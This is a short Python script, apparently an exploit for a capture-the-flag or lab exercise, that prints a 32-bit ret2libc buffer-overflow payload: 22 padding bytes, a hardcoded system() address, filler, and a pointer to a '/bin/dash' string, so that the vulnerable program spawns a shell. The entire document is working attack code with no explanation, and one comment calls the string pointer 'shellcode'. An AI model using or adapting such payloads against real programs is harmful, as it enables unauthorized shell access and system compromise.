import sys

addr = 0x804fef0.to_bytes(4, "little") #system address
addr2 = 0xfff6b998.to_bytes(4, "little") #shellcode string
sys.stdout.buffer.write(b"A" * 22 + addr + b"f"*4 + addr2 + b"/bin/dash")
